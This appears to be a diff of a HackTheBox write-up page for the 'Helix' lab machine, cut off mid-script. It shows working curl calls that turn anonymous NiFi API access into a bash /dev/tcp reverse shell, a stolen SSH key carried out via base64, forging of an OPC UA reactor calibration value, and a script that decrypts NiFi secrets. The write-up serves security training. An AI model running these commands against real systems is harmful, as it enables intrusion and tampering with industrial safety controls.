FcvoWboSO1Ru7542p3ig1bFTgulOmzeyc0+M6Ex53D+cErjtv4+KVa63SCPlEPEKgoOlbt90EE1RRHOlGcs67esZcb5Q66QIalBbDYXOU7VcTYq3frj2eqhFkWCiPVhS3zp4zURXF0YT846s3Sp1gX1g4bA6VFs+QLxTUHqd2zr5ky/X2KRNSeHhX0p4xa87GTdda1umMuN+dTaBD9UZ/7PVGqXe6Ya7jdM7p6Zg+saXFEUUIsYLa47xFp6g9DkOrQAKJrdtuCp3RsQqCC0VRu+YuGEenidQ732/G6NJVG1S10l2L1bDZXFHVrdtuIsPve8TDLNyFs86/ZOGy1VapdDpzBycaS0r92XMXaLou5HzKcRPp+4nkaSotjsZs2+Vy9/wl512yabh9j/ikYVpza/vpqSiO6IX4njfK/Y1SJ4cAwHGc7gWLq7VrsSqP1bZKl255X8f0ma5jn+jjngxK39t8/R9VcY9iJWKMRaOxGaPb3yg1jK08raXFUUULR/c9ntQ5fNdjDvYoLl9z9uoNp7mieCrHEgHM6Vkk2Rrf4/c9r6m1/WhpsVbAPLbvcc05F56YAsfv4tf3o/HEaa4ojnRbMfW9mV1zw5EoZ3IMxpgXStd1FixZGU+mq7trsSpPNqg9pk/Y94jftdLb1uVbt7VNnVbdPYqVvuu+39Ta3tY+1fPlCj7W9AVX1aFdi7Xmkb9de7zuA8dFYPgdMdHQHsXyBOxRrCiJMFRvnC/rjWN96p7rTpk+c+bsM1NaHHkRD2qP525cvOJdtcehC+WcaxO6R7Gyu8s575q3SNYbx7o+Du1aNCdw12JVzPnbtUcEQ1AGFcX3XL51dveZqSiO/MZ77rTO2bLeOLYVhrOwaU7orsWqeL3v2vdIcLBuBxXF7o2brrVKJVxLC/fbERj1k+nMFFlvHEN4i13H6ew686XFEXVs3+Oco7VHLNA7Koq8Ro18sL9xztyFp56nKvXOV7l2SoujMOpcUdWrjtYecSmfW3/exYuWBxXFWjXyCBils+bOH+XOI0lkFQeinh67bpXL3QuXnrvxvaVCDrdPnXHF1Tc6tlXLlw4Ye57bMXVGU2u7rDeO/IwBXMfuWbisdkqLo+HSLpcu2XLdjFlz8ZYbPpJIpX2/1rdFM8Yi0dj0WXPq5S6fSW8HIYzxkpXr6+g2BZv9zWj8qhs/+v8B3foXqUKgP24AAAAASUVORK5CYII=" alt="db-d2" width="30" height="30"></span><b>db-d2</b></a>
+  <span class="tagline mono">// hack the box</span>
 </div></header>
-<main class="wrap"><section style="border-bottom:none;">
-  <div class="badge">
-    <span class="k">achievement</span>
-    <div class="bname">Helix — pwned</div>
-    <div class="bmeta">rooted 24 Jul 2026 · Medium · Linux</div>
-    <p>This box is still active, so the full write-up is locked until it retires (HTB rules). Here's the proof of the root in the meantime.</p>
-    <a class="blink" href="https://labs.hackthebox.com/achievement/machine/153734/894">View achievement on HTB ↗</a>
+
+<header class="hero">
+  <div class="wrap hero-inner">
+    <div class="crumb mono"><a href="../index.html">cd ..</a> &nbsp;/&nbsp; all write-ups</div>
+    <div class="prompt-line mono">
+      <span><span class="u">db-d2</span>@<span class="p">kali</span>:~$</span>
+      <span>./pwn helix.htb</span>
+    </div>
+    <h1 class="title">Helix<span class="cursor" aria-hidden="true"></span></h1>
+    <p class="thesis">A Medium Linux box modelling an industrial reactor plant, where every step lives one layer down. A hidden vhost runs <strong>Apache NiFi</strong> with anonymous access and the restricted <span class="code">execute-code</span> permission, so a processor is a shell. An operator's SSH key is sitting in NiFi's own <strong>support-bundles</strong> directory. Then the OT layer, where forging a single <strong>OPC UA</strong> calibration offset drives the reactor's reported temperature into a hazardous band, which makes the root safety controller authorize a maintenance window that a NOPASSWD console reads as consent.</p>
+    <div class="meta-row">
+      <span><b>target</b> 10.129.245.123</span>
+      <span><b>platform</b> HackTheBox · Linux</span>
+      <span><b>difficulty</b> Medium</span>
+      <span><b>tags</b> nifi · opc-ua · ics · pbkdf2 · sudo</span>
+      <span><b>status</b> rooted</span>
+    </div>
   </div>
-  <p class="lede" style="margin-top:22px;">Browse the <a href="../safe/index.html">Safe write-up</a> or the <a href="../index.html">full list of owned machines</a>.</p>
-</section></main>
+</header>
+
+<main class="wrap">
+
+  <div class="chain" aria-label="Privilege path">
+    <div class="node">
+      <div class="tier">Foothold · service</div>
+      <div class="who">nifi</div>
+      <div class="via">NiFi anonymous · ExecuteProcess RCE</div>
+      <div class="arrow" aria-hidden="true">→</div>
+    </div>
+    <div class="node">
+      <div class="tier">Pivot · host user</div>
+      <div class="who">operator</div>
+      <div class="via">SSH key in NiFi support-bundles</div>
+      <div class="arrow" aria-hidden="true">→</div>
+    </div>
+    <div class="node root">
+      <div class="tier">Privesc · root</div>
+      <div class="who">root</div>
+      <div class="via">OPC UA maintenance window → sudo console</div>
+    </div>
+  </div>
+
+  <p class="lede" style="margin-top:26px;">Every command below was re-run against a live instance while writing this up, and the output is what came back. The target IP changes with every spawn, so substitute your own. The ports, node IDs and property names do not change.</p>
+
+  <section>
+    <div class="sec-head"><span class="sec-num">01</span><h2>Recon<span class="sub">two ports · a static plant · a hidden vhost</span></h2></div>
+    <p class="lede">Start where you always start. A fast sweep over all 65535 TCP ports to find out what is listening, then a slower scripted scan against only the ports that answered. Splitting it in two matters because <span class="code">-sVC</span> across the full range takes minutes, while the same thing across two ports takes seconds.</p>
+    <div class="term"><div class="term-bar"><span class="lamp a"></span><span class="lamp b"></span><span class="lamp c"></span><span class="label">nmap — phase 1, find the doors</span></div><div class="term-scroll"><pre class="term-body"><span class="pr">db-d2@kali:~$</span> <span class="cmd">sudo nmap -sS -p- --min-rate 1500 --max-retries 2 -T4 --open 10.129.245.123</span>
+<span class="out">Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+
+Nmap done: 1 IP address (1 host up) scanned in 23.27 seconds</span></pre></div></div>
+    <div class="term"><div class="term-bar"><span class="lamp a"></span><span class="lamp b"></span><span class="lamp c"></span><span class="label">nmap — phase 2, ask what they are</span></div><div class="term-scroll"><pre class="term-body"><span class="pr">db-d2@kali:~$</span> <span class="cmd">nmap -sVC -p 22,80 10.129.245.123</span>
+<span class="out">PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.15 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   256 60:b3:f7:6c:0b:92:ab:00:ac:e7:12:e1:d1:26:9c:1e (ECDSA)
+|_  256 c8:30:e6:cb:c6:cd:fc:0c:39:e5:34:04:20:07:b9:b3 (ED25519)
+80/tcp open  http    nginx 1.18.0 (Ubuntu)
+|_http-title: Helix Industries | Industrial Automation &amp; Critical Infrastruc...
+|_http-server-header: nginx/1.18.0 (Ubuntu)</span></pre></div></div>
+    <p>Two ports, and SSH is a modern OpenSSH on Ubuntu 22.04, so the web server is the entire attack surface. Curl the landing page before firing any scanner at it, because a corporate brochure usually tells you what the box is about faster than a wordlist does.</p>
+    <div class="term"><div class="term-bar"><span class="lamp a"></span><span class="lamp b"></span><span class="lamp c"></span><span class="label">read the page, not the DOM</span></div><div class="term-scroll"><pre class="term-body"><span class="pr">db-d2@kali:~$</span> <span class="cmd">echo "10.129.245.123 helix.htb flow.helix.htb" | sudo tee -a /etc/hosts</span>
+<span class="pr">db-d2@kali:~$</span> <span class="cmd">curl -s http://helix.htb/ | sed -n '/&lt;body/,$p' \
+     | sed -e 's/&lt;[^&gt;]*&gt;//g' -e 's/^[[:space:]]*//' | awk 'NF &amp;&amp; !seen[$0]++' | head -12</span>
+<span class="out">Helix Industries
+<span class="hi">Operations Center</span>
+Services
+Capabilities
+Industries
+Contact
+Request a call
+Start a project
+Industrial Operations | Critical Infrastructure | Since 2014
+Engineering
+Operational
+Certainty.</span>
+<span class="pr">db-d2@kali:~$</span> <span class="cmd">curl -s http://helix.htb/ | grep -oE 'href="[^"]*"' | sort -u</span>
+<span class="out">href="#capabilities"  href="#contact"  href="#industries"  href="#services"  href="#top"</span></pre></div></div>
+    <p>Strip the tags and read the words. The page is a single-screen brochure whose navigation is nothing but same-page anchors, whose contact forms are JavaScript modals with a submit handler that only closes the modal, and which has no <span class="code">robots.txt</span>. There is a prominent <em>Operations Center</em> control in the header that leads nowhere, and that is the useful part. The site is telling you an operations application exists while refusing to say where it lives. On a box with two open ports and no second path under the web root, the only place left to put one is a virtual host.</p>
+    <p>Virtual-host fuzzing works here because nginx answers an unknown <span class="code">Host:</span> header with a 154-byte redirect stub, which is nothing like the 43&nbsp;KB brochure. Filtering on that one size makes the real vhost the only thing that survives.</p>
+    <div class="term"><div class="term-bar"><span class="lamp a"></span><span class="lamp b"></span><span class="lamp c"></span><span class="label">ffuf — vhost</span></div><div class="term-scroll"><pre class="term-body"><span class="pr">db-d2@kali:~$</span> <span class="cmd">curl -s -o /dev/null -w "unknown host -&gt; %{http_code} %{size_download}B\n" \
+     -H "Host: nope.helix.htb" http://10.129.245.123/</span>
+<span class="out">unknown host -&gt; 302 154B</span>
+
+<span class="pr">db-d2@kali:~$</span> <span class="cmd">ffuf -u http://helix.htb/ -H "Host: FUZZ.helix.htb" \
+     -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -mc all -fs 154</span>
+<span class="hi">flow</span>                    [Status: 200, Size: 1068, Words: 110, Lines: 28, Duration: 108ms]</pre></div></div>
+    <p>One hit. The 1068-byte body is worth reading rather than just counting, because the application introduces itself.</p>
+    <div class="term"><div class="term-bar"><span class="lamp a"></span><span class="lamp b"></span><span class="lamp c"></span><span class="label">fingerprint flow.helix.htb</span></div><div class="term-scroll"><pre class="term-body"><span class="pr">db-d2@kali:~$</span> <span class="cmd">curl -s http://flow.helix.htb/ | sed 's/&lt;[^&gt;]*&gt;//g' | grep -vE '^\s*$'</span>
+<span class="out">NiFi
+Did you mean: <span class="hi">/nifi</span>
+You may have mistyped... but we'll try to redirect you in 5 seconds.</span>
+
+<span class="pr">db-d2@kali:~$</span> <span class="cmd">curl -s http://flow.helix.htb/nifi-api/flow/about | jq -r '.about | "\(.version) \(.buildTag) \(.buildTimestamp)"'</span>
+<span class="hi">1.21.0 nifi-1.21.0-RC2 04/03/2023 21:28:28 UTC</span></pre></div></div>
+    <div class="callout note"><span class="k">Orientation</span><p>Apache NiFi is a dataflow tool. You build a graph of processors in a browser, and every processor is a small piece of code that NiFi runs on your behalf. Hold onto that. The rest of the box is dressed as an OT plant, with the brochure as scenery and an OPC UA reactor simulation guarding root.</p></div>
+    <p>NiFi 1.21.0 does carry published CVEs, and checking them is the reflex. None of them are needed here. What follows is a configuration problem, and configuration problems do not get CVE numbers.</p>
+  </section>
+
+  <section>
+    <div class="sec-head"><span class="sec-num">02</span><h2>Foothold as nifi<span class="sub">anonymous access · execute-code · ExecuteProcess RCE</span></h2></div>
+    <p>Two API calls decide whether this is going to be hard. The first asks whether NiFi even has a login, and the second asks who NiFi thinks you are.</p>
+    <div class="term"><div class="term-bar"><span class="lamp a"></span><span class="lamp b"></span><span class="lamp c"></span><span class="label">who am I to NiFi?</span></div><div class="term-scroll"><pre class="term-body"><span class="pr">db-d2@kali:~$</span> <span class="cmd">curl -s http://flow.helix.htb/nifi-api/access/config</span>
+<span class="out">{"config":{"supportsLogin":<span class="hi">false</span>}}</span>
+
+<span class="pr">db-d2@kali:~$</span> <span class="cmd">curl -s http://flow.helix.htb/nifi-api/flow/current-user | jq '{identity, anonymous, restrictedComponentsPermissions}'</span>
+<span class="out">{
+  "identity": "<span class="hi">anonymous</span>",
+  "anonymous": true,
+  "restrictedComponentsPermissions": { "canRead": true, <span class="hi">"canWrite": true</span> }
+}</span></pre></div></div>
+    <p>Login is disabled, so every request arrives as the built-in <span class="code">anonymous</span> identity, and that identity has been granted write access to restricted components. Restricted components are the ones NiFi deliberately fences off because they let a flow author reach outside the JVM. The individual fences live in a separate array, and one of them is the one that matters.</p>
+    <div class="term"><div class="term-bar"><span class="lamp a"></span><span class="lamp b"></span><span class="lamp c"></span><span class="label">the fence that is down</span></div><div class="term-scroll"><pre class="term-body"><span class="pr">db-d2@kali:~$</span> <span class="cmd">curl -s http://flow.helix.htb/nifi-api/flow/current-user \
+     | jq '.componentRestrictionPermissions[] | select(.requiredPermission.id=="execute-code")'</span>
+<span class="out">{
+  "requiredPermission": { "id": "<span class="hi">execute-code</span>", "label": "execute code" },
+  "permissions": { "canRead": true, <span class="hi">"canWrite": true</span> }
+}</span></pre></div></div>
+    <div class="callout"><span class="k">Why this is already over</span><p>An anonymous identity holding <span class="code">execute-code</span> means anyone who can reach the port may create a processor whose entire job is to run a command. The permission is working exactly as designed, on a user who should never have had it. And the NiFi web UI is only a client for the REST API underneath, so anything the UI can do a <span class="code">curl</span> can do without ever loading the page.</p></div>
+    <h3>Picking the right processor</h3>
+    <p>NiFi processors come in two kinds, and the difference decides whether the attack fires at all. Most are transforms. They sit waiting for a flowfile to arrive from an upstream processor, and with nothing upstream they never run. A few are <em>source</em> processors, which take no input and execute on their own schedule the moment you start them. <span class="code">ExecuteProcess</span> is a source processor, so one of them alone on an empty canvas is enough. Its sibling <span class="code">ExecuteStreamCommand</span> is a transform, and building the attack around that one means also building something to feed it.</p>
+    <p>Create one and read back its property descriptors, because guessing property names is the single easiest way to waste an afternoon here. NiFi accepts unknown property names without complaint and then ignores them.</p>
+    <div class="term"><div class="term-bar"><span class="lamp a"></span><span class="lamp b"></span><span class="lamp c"></span><span class="label">create the processor, read its real properties</span></div><div class="term-scroll"><pre class="term-body"><span class="pr">db-d2@kali:~$</span> <span class="cmd">U=http://flow.helix.htb
+PG=$(curl -s $U/nifi-api/flow/process-groups/root | jq -r .processGroupFlow.id)
+PID=$(curl -s -X POST $U/nifi-api/process-groups/$PG/processors \
+  -H 'Content-Type: application/json' \
+  -d '{"revision":{"clientId":"x","version":0},
+       "component":{"type":"org.apache.nifi.processors.standard.ExecuteProcess",
+                    "name":"x","position":{"x":0,"y":0}}}' | jq -r .id)
+
+curl -s $U/nifi-api/processors/$PID \
+  | jq -r '.component.config.descriptors | to_entries[] | "\(.key)  default=\(.value.defaultValue|tostring)"'</span>
+<span class="out">Command                default=null
+<span class="hi">Command Arguments</span>      default=null
+Batch Duration         default=null
+Redirect Error Stream  default=false
+Working Directory      default=null
+<span class="hi">Argument Delimiter</span>     default= </span></pre></div></div>
+    <div class="callout cve"><span class="k">The two details that decide whether you get a shell</span><p>The arguments property is called <strong><span class="code">Command Arguments</span></strong>, not <span class="code">Arguments</span>. Send the wrong name and the API still returns HTTP 200, the processor still starts, and it runs your command with no arguments at all, which for <span class="code">bash</span> means it exits immediately and nothing ever connects back.</p>
+    <p>The second detail is <span class="code">Argument Delimiter</span>, which defaults to a single space. ExecuteProcess does not hand your command to a shell, it splits the arguments string on that delimiter and execs the result directly. With the default, <span class="code">-c bash -i &gt;&amp; /dev/tcp/...</span> becomes eight separate arguments and <span class="code">bash -c</span> receives only the word <span class="code">bash</span>. Change the delimiter to <span class="code">;</span> and the payload stays in one piece as exactly two arguments.</p></div>
+    <h3>Optimistic locking</h3>
+    <p>Every mutating call carries the object's current <span class="code">revision.version</span>, which the server increments on each accepted write. Read it back between calls rather than counting. NiFi will forgive a stale version if the <span class="code">clientId</span> matches the one that made the last change, on the grounds that a client is allowed to race itself, but a different client identifier gets refused.</p>
+    <div class="term"><div class="term-bar"><span class="lamp a"></span><span class="lamp b"></span><span class="lamp c"></span><span class="label">what a stale revision looks like</span></div><div class="term-scroll"><pre class="term-body"><span class="pr">db-d2@kali:~$</span> <span class="cmd">curl -s -w "\nHTTP %{http_code}\n" -X PUT $U/nifi-api/processors/$PID \
+  -H 'Content-Type: application/json' \
+  -d '{"revision":{"clientId":"someone-else","version":0},"component":{"id":"'$PID'","name":"stale"}}'</span>
+<span class="no">[0, someone-else, d404ec7b-...] is not the most up-to-date revision. This component appears to have been modified
+HTTP 400</span></pre></div></div>
+    <h3>Fire it</h3>
+    <p>Configure and start. <span class="code">autoTerminatedRelationships</span> stops NiFi complaining that the <span class="code">success</span> relationship goes nowhere, and a long <span class="code">schedulingPeriod</span> keeps the processor from re-firing every second and stacking up shells behind the one you are using.</p>
+    <div class="term"><div class="term-bar"><span class="lamp a"></span><span class="lamp b"></span><span class="lamp c"></span><span class="label">configure → start</span></div><div class="term-scroll"><pre class="term-body"><span class="pr">db-d2@kali:~$</span> <span class="cmd">LHOST=10.10.16.212; LPORT=4444
+rev(){ curl -s $U/nifi-api/processors/$1 | jq -r .revision.version; }
+
+curl -s -X PUT $U/nifi-api/processors/$PID -H 'Content-Type: application/json' \
+  -d '{"revision":{"clientId":"x","version":'$(rev $PID)'},
+       "component":{"id":"'$PID'","config":{
+          "autoTerminatedRelationships":["success"],
+          "schedulingStrategy":"TIMER_DRIVEN","schedulingPeriod":"3600 sec",
+          "properties":{
+            "Command":"bash",
+            "Argument Delimiter":";",
+            "Command Arguments":"-c;bash -i &gt;&amp; /dev/tcp/'$LHOST'/'$LPORT' 0&gt;&amp;1"}}}}'
+
+curl -s -X PUT $U/nifi-api/processors/$PID/run-status -H 'Content-Type: application/json' \
+  -d '{"revision":{"clientId":"x","version":'$(rev $PID)'},"state":"RUNNING","disconnectedNodeAcknowledged":false}'</span></pre></div></div>
+    <div class="term"><div class="term-bar"><span class="lamp a"></span><span class="lamp b"></span><span class="lamp c"></span><span class="label">catch it</span></div><div class="term-scroll"><pre class="term-body"><span class="pr">db-d2@kali:~$</span> <span class="cmd">nc -lvnp 4444</span>
+<span class="out">listening on [any] 4444 ...
+connect to [10.10.16.212] from (UNKNOWN) [10.129.245.123] 59320
+bash: cannot set terminal process group (978): Inappropriate ioctl for device
+bash: no job control in this shell</span>
+<span class="pr">nifi@helix:/opt/nifi-1.21.0$</span> <span class="cmd">id; hostname</span>
+<span class="out">uid=998(nifi) gid=998(nifi) groups=998(nifi)
+helix</span></pre></div></div>
+    <p>A plain bash reverse shell over <span class="code">/dev/tcp</span>, caught with plain netcat. This box needs neither a base64 wrapper nor a Python PTY payload, which is a good argument for trying the boring version first and only escalating the payload when the boring version fails.</p>
+  </section>
+
+  <section>
+    <div class="sec-head"><span class="sec-num">03</span><h2>nifi → operator<span class="sub">a key in the service's own diagnostics · user.txt</span></h2></div>
+    <p>The shell lands as <span class="code">nifi</span>, an unprivileged service account, and it lands inside NiFi's install directory. There is no <span class="code">user.txt</span> here and the plant's own directory is closed.</p>
+    <div class="term"><div class="term-bar"><span class="lamp a"></span><span class="lamp b"></span><span class="lamp c"></span><span class="label">where the walls are</span></div><div class="term-scroll"><pre class="term-body"><span class="pr">nifi@helix:/opt/nifi-1.21.0$</span> <span class="cmd">ls -ld /opt/helix; ls /opt/helix</span>
+<span class="out">drwxr-x--- 9 root <span class="hi">helixsvc</span> 4096 May  5 10:18 /opt/helix
+ls: cannot open directory '/opt/helix': Permission denied</span></pre></div></div>
+    <p>The OT services live in <span class="code">/opt/helix</span>, owned by root and readable only by the <span class="code">helixsvc</span> group, and <span class="code">nifi</span> belongs to no group but its own. That closes off the sideways move into the plant and leaves NiFi's own files as the only place to look. Go through the directories a service writes for itself. Backups, state and diagnostic bundles are where operational secrets end up by accident.</p>
+    <div class="term"><div class="term-bar"><span class="lamp a"></span><span class="lamp b"></span><span class="lamp c"></span><span class="label">an operator's key in the open</span></div><div class="term-scroll"><pre class="term-body"><span class="pr">nifi@helix:/opt/nifi-1.21.0$</span> <span class="cmd">ls -la support-bundles/</span>
+<span class="out">drwxr-x---  2 nifi nifi 4096 May  5 10:18 .
+-rw-r-----  1 nifi nifi  411 Jan 25  2026 <span class="hi">operator_id_ed25519.bak</span></span>
+<span class="pr">nifi@helix:/opt/nifi-1.21.0$</span> <span class="cmd">head -1 support-bundles/operator_id_ed25519.bak</span>
+<span class="out">-----BEGIN OPENSSH PRIVATE KEY-----</span></pre></div></div>
+    <p>An unencrypted ed25519 private key, 411 bytes, owned by <span class="code">nifi</span> and readable by <span class="code">nifi</span>. Somebody collected a support bundle from a management host and left the operator's key inside it. Copy it back to Kali and use it from there, which is worth the extra step because SSHing out of a raw reverse shell means no controlling terminal and a client that stops to ask about host keys.</p>
+    <div class="term"><div class="term-bar"><span class="lamp a"></span><span class="lamp b"></span><span class="lamp c"></span><span class="label">exfil the key, then log in properly</span></div><div class="term-scroll"><pre class="term-body"><span class="pr">nifi@helix:/opt/nifi-1.21.0$</span> <span class="cmd">base64 -w0 support-bundles/operator_id_ed25519.bak</span>
+<span class="out">LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0K...</span>
+
+<span class="pr">db-d2@kali:~$</span> <span class="cmd">base64 -d &lt; key.b64 &gt; opkey &amp;&amp; chmod 600 opkey &amp;&amp; ssh-keygen -l -f opkey</span>
+<span class="out">256 SHA256:UYZml1z6xpiv+uEWpsxWR6DbPgH+M5GtlEuV479ZaVo <span class="hi">root@management</span> (ED25519)</span>
+
+<span class="pr">db-d2@kali:~$</span> <span class="cmd">ssh -i opkey -o StrictHostKeyChecking=no operator@helix.htb</span>
+<span class="pr">operator@helix:~$</span> <span class="cmd">id; cat user.txt</span>
+<span class="out">uid=1001(operator) gid=1001(operator) groups=1001(operator)</span>
+<span class="win">8·······························</span></pre></div></div>
+    <p>The key comment is <span class="code">root@management</span>. It was generated on some other host and rode here inside a diagnostic bundle, which is exactly how this kind of leak happens outside a lab.</p>
+  </section>
+
+  <section>
+    <div class="sec-head"><span class="sec-num">04</span><h2>The OT layer<span class="sub">loopback services · a tunnel · the plant's address space</span></h2></div>
+    <p>The external scan found two ports. That answered a different question than the useful one, because a port scan from outside only ever sees what is bound to an external interface. Ask the host directly.</p>
+    <div class="term"><div class="term-bar"><span class="lamp a"></span><span class="lamp b"></span><span class="lamp c"></span><span class="label">what the box is really running</span></div><div class="term-scroll"><pre class="term-body"><span class="pr">operator@helix:~$</span> <span class="cmd">ss -lnt</span>
+<span class="out">State  Recv-Q Send-Q  Local Address:Port
+LISTEN 0      128         <span class="hi">127.0.0.1:8081</span>          <span class="c">&lt;- HMI dashboard</span>
+LISTEN 0      50          127.0.0.1:8080          <span class="c">&lt;- NiFi, behind nginx</span>
+LISTEN 0      100         <span class="hi">127.0.0.1:4840</span>          <span class="c">&lt;- OPC UA</span>
+LISTEN 0      128           0.0.0.0:22
+LISTEN 0      511           0.0.0.0:80</span>
+<span class="pr">operator@helix:~$</span> <span class="cmd">systemctl list-units --type=service | grep -i helix</span>
+<span class="out">helix-hmi.service      loaded active running Helix HMI Dashboard
+helix-plc.service      loaded active running <span class="hi">Helix PLC (OPC UA)</span>
+helix-safety.service   loaded active running <span class="hi">Helix Safety Controller</span></span></pre></div></div>
+    <p>Three services, all bound to loopback. 4840 is the registered port for OPC UA, the protocol industrial equipment uses to publish tags and accept commands, and 8081 is a dashboard. Forward both to Kali so the tooling can run locally.</p>
+    <div class="term"><div class="term-bar"><span class="lamp a"></span><span class="lamp b"></span><span class="lamp c"></span><span class="label">tunnel</span></div><div class="term-scroll"><pre class="term-body"><span class="pr">db-d2@kali:~$</span> <span class="cmd">ssh -i opkey -o StrictHostKeyChecking=no -N \
+     -L 14840:127.0.0.1:4840 \
+     -L 18081:127.0.0.1:8081 operator@helix.htb &amp;</span>
+<span class="pr">db-d2@kali:~$</span> <span class="cmd">curl -s http://127.0.0.1:18081/ | sed 's/&lt;[^&gt;]*&gt;//g' | grep -vE '^\s*$'</span>
+<span class="out">Helix Industries — Reactor HMI
+Maintenance window is NOT the same as MAINTENANCE mode. Window opens only when
+safety controller authorizes it under hazardous test conditions.
+Reactor    Temperature: 280.8 °C   Pressure: 68.83 bar
+           Raw Temp: 280.8 °C | CalibrationOffset: 0.0 °C
+Safety     Trip Active: False   Rods Inserted: False   Emergency Cooling: False
+Control    Mode: NORMAL   Test Override: False   Test Mode Active: NO
+           OPC UA (internal): opc.tcp://127.0.0.1:4840/helix/
+Privileged Maintenance Window
+Status: <span class="no">CLOSED</span>
+No maintenance window file present.
+This window is granted by the safety controller only when a hazardous test
+condition is detected (<span class="hi">e.g., Temp ≥ 295°C or Pressure ≥ 73 bar</span>) while still below trip.</span></pre></div></div>
+    <p>The dashboard hands over the rule for free. Something grants a privileged maintenance window, and it does so when the plant looks dangerous but has not yet tripped. It also shows the shape of the temperature reading, splitting it into a raw value and a calibration offset. Browse the address space to see which of those an unprivileged client is allowed to touch.</p>
+    <div class="term"><div class="term-bar"><span class="lamp a"></span><span class="lamp b"></span><span class="lamp c"></span><span class="label">browse ns=2</span></div><div class="term-scroll"><pre class="term-body"><span class="cmd">import asyncio
+from asyncua import Client, ua
+
+async def main():
+    c = Client("opc.tcp://127.0.0.1:14840/helix/")
+    await c.connect()
+    async def walk(node):
+        for ch in await node.get_children():
+            nid = ch.nodeid.to_string()
+            if not nid.startswith("ns=2"): continue
+            bn = (await ch.read_browse_name()).Name
+            if await ch.read_node_class() == ua.NodeClass.Variable:
+                al = (await ch.read_attribute(ua.AttributeIds.AccessLevel)).Value.Value
+                rw = ("R" if al &amp; 1 else "-") + ("W" if al &amp; 2 else "-")
+                print(f"{nid:&lt;12}{bn:&lt;20}{rw:&lt;6}{await ch.read_value()!r}")
+            else:
+                print(f"{nid:&lt;12}{bn}")
+            await walk(ch)
+    await walk(c.nodes.objects)
+    await c.disconnect()
+
+asyncio.run(main())</span></pre></div></div>
+    <div class="tbl-scroll">
+      <table>
+        <thead><tr><th>Node</th><th>Browse name</th><th>Access</th><th>Value</th><th>Role in the plant</th></tr></thead>
+        <tbody>
+          <tr><td>ns=2;i=1</td><td>Plant</td><td>—</td><td>object</td><td>root folder</td></tr>
+          <tr><td>ns=2;i=2</td><td>Reactor</td><td>—</td><td>object</td><td></td></tr>
+          <tr><td>ns=2;i=3</td><td>TemperatureRaw</td><td>R–</td><td>283.82</td><td>what the sensor measures</td></tr>
+          <tr><td>ns=2;i=4</td><td>Temperature</td><td>R–</td><td>283.82</td><td>what everything else reads</td></tr>
+          <tr><td>ns=2;i=5</td><td>Pressure</td><td>R–</td><td>68.98</td><td></td></tr>
+          <tr><td class="w">ns=2;i=6</td><td class="w">CalibrationOffset</td><td class="w">RW</td><td class="w">0.0</td><td class="w">added to raw to make Temperature</td></tr>
+          <tr><td>ns=2;i=7</td><td>Safety</td><td>—</td><td>object</td><td></td></tr>
+          <tr><td>ns=2;i=8</td><td>RodsInserted</td><td>RW</td><td>False</td><td></td></tr>
+          <tr><td>ns=2;i=9</td><td>EmergencyCooling</td><td>RW</td><td>False</td><td></td></tr>
+          <tr><td>ns=2;i=10</td><td>TripActive</td><td>R–</td><td>False</td><td>latched by the controller</td></tr>
+          <tr><td>ns=2;i=11</td><td>Control</td><td>—</td><td>object</td><td></td></tr>
+          <tr><td class="w">ns=2;i=12</td><td class="w">Mode</td><td class="w">RW</td><td class="w">'NORMAL'</td><td class="w">NORMAL or MAINTENANCE</td></tr>
+          <tr><td class="w">ns=2;i=13</td><td class="w">TestOverride</td><td class="w">RW</td><td class="w">False</td><td class="w">marks work as an authorized test</td></tr>
+          <tr><td>ns=2;i=14</td><td>ResetTrip</td><td>RW</td><td>False</td><td>clears a latched trip</td></tr>
+        </tbody>
+      </table>
+    </div>
+    <p>The whole privilege escalation is visible in that table. <span class="code">Temperature</span> is read-only and so is <span class="code">TemperatureRaw</span>, but <span class="code">CalibrationOffset</span> is writable, and the dashboard already said <span class="code">Temperature</span> is the sum of the other two. Confirm the relationship rather than assuming it.</p>
+    <div class="term"><div class="term-bar"><span class="lamp a"></span><span class="lamp b"></span><span class="lamp c"></span><span class="label">the sensor is a lie you can write to</span></div><div class="term-scroll"><pre class="term-body"><span class="pr">db-d2@kali:~$</span> <span class="cmd">python3 offset_test.py</span>
+<span class="out">offset readback = 7.5
+raw=283.97 calibrated=291.47 <span class="hi">delta=7.50</span>
+offset restored to 0.0</span></pre></div></div>
+    <div class="callout note"><span class="k">Aside — the credential you are supposed to need</span>
+    <p>The intended route hands you an OPC UA credential first. NiFi's flow definition holds a connection pool whose password is stored encrypted, and the key that protects it is sitting in the same directory in plaintext.</p>
+    <p>Read as <span class="code">nifi</span>, <span class="code">conf/flow.json.gz</span> contains <span class="code">"Database User":"operator"</span> alongside a <span class="code">Password</span> of <span class="code">enc{7de8f8ca9dda8c08...}</span>, and <span class="code">conf/nifi.properties</span> carries <span class="code">nifi.sensitive.props.key=TUHh+YHA30zmdlcA8xq/elNBLPkO03Nl</span> with <span class="code">nifi.sensitive.props.algorithm=NIFI_PBKDF2_AES_GCM_256</span>. That algorithm name is a complete specification. PBKDF2-HMAC-SHA512, 160&nbsp;000 iterations, a hardcoded salt of <span class="code">"NiFi Static Salt"</span> that is not stored in the blob, then AES-256-GCM laid out as <span class="code">IV(16) ‖ ciphertext ‖ tag(16)</span>. Because GCM authenticates, a decrypt that returns without raising is certainly right, which means there is nothing to verify by hand.</p>
+    <p>Your ciphertext will not match the one above. NiFi rewrites the flow with a fresh random IV, so the blob differs between instances while the plaintext does not.</p></div>
+    <div class="term"><div class="term-bar"><span class="lamp a"></span><span class="lamp b"></span><span class="lamp c"></span><span class="label">decrypt the flow secret</span></div><div class="term-scroll"><pre class="term-body"><span class="cmd">from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
+from cryptography.hazmat.primitives import hashes
+from cryptography.hazmat.primitives.ciphers.aead import AESGCM
+
+props_key = "TUHh+YHA30zmdlcA8xq/elNBLPkO03Nl"   <span class="c"># nifi.properties</span>
+enc_hex   = "7de8f8ca9dda8c08e8f622e35a3f5239e8dda7183a0acb65..."  <span class="c"># enc{...} from flow.json.gz</span>
+
+blob = bytes.fromhex(enc_hex)
+key  = PBKDF2HMAC(hashes.SHA512(), 32, b"NiFi Static Salt", 160000).derive(props_key.encode())
